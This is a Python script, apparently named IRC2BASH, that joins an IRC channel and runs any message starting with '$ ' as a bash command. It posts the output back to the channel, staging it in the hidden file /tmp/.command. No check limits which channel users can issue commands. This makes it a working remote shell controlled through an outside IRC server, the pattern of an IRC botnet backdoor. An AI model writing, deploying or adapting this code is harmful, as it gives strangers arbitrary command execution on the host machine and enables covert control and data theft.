import os, socket, _thread, time

class IRC2BASH:
    ip:   str = "" # up to the user to set these values
    port: int = 0
    name: str = ""  
    nick: str = ""
    chan: str = ""
    
    send = lambda string: IRC2BASH.sock.send(f"{string}\r\n".encode("utf-8"))
    server = (ip, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def main() -> None:
        IRC2BASH.sock.connect(IRC2BASH.server)

        time.sleep(5) # wait for server to connect
        
        IRC2BASH.send(f"USER {IRC2BASH.nick} * * :{IRC2BASH.name}")
        time.sleep(1) # wait for server to process
        
        IRC2BASH.send(f"NICK {IRC2BASH.nick}")
        time.sleep(5) # wait for server to process
        
        IRC2BASH.send(f"JOIN {IRC2BASH.chan}")
        time.sleep(1)

        _thread.start_new_thread(IRC2BASH.receive_messages, (IRC2BASH.sock,))

        while True: # ping the server every minute so the connection stays alive
            time.sleep(60)
            IRC2BASH.send(f"PING :{IRC2BASH.ip}")

    def receive_messages(sock) -> None:
        while True:
            data = sock.recv(1024)
            if not data:
                break

            response = data.decode("utf-8")
            response = response.strip()
            response = response[1:]
            response = response.split(" ")

            #
            # attempt to find a username in part #1
            #

            try:
                username = response[0]
                username = username.split("!")
                username = username[0]
            except Exception:
                username = ""
            
            #
            # attempt to find the channel name
            #

            try:
                if response[1] == "PRIVMSG" and response[2] == IRC2BASH.chan: # correct channel
                    channel = response[2]
                else:
                    channel = ""
            except Exception:
                channel = ""

            #
            # attempt to parse the actual message
            #

            try:
                message = response[3:]
                parsed_message = ""
                for word in message:
                    parsed_message = f"{parsed_message} {word}"

                message = parsed_message
                parsed_message = None

                message = message.strip()
                message = message[1:]
            except Exception:
                message = ""

            #
            # see if the message is a command
            #

            try:
                if message.startswith("$ "):
                    command = message[2:]
                else:
                    command = ""
            except Exception:
                command = ""

            #
            # we now (probably) have the command :D, time to run it
            #

            if username != "" and channel != "" and message != "" and command != "":
                
                #
                # escape quotation marks and backslashes
                #

                command_list = []
                for letter in command:
                    match letter:
                        case "\\":
                            command_list.append("\\\\")

                        case "\"":
                            command_list.append("\\\"")

                        case _:
                            command_list.append(letter)

                command = ""
                for letter in command_list:
                    command = f"{command}{letter}"

                command_list = None

                print(f"{channel}: <{username}> {command}")
                os.system(f"/bin/bash -c \"{command}\" >/tmp/.command 2>&1")

                with open("/tmp/.command", "r") as f:
                    output = f.read()
                
                output = output.strip().split("\n")
                print(output)
                for line in output:
                    IRC2BASH.send(f"PRIVMSG {IRC2BASH.chan} :{line}")
                    time.sleep(0.75)

if __name__ == "__main__":
    IRC2BASH.main()
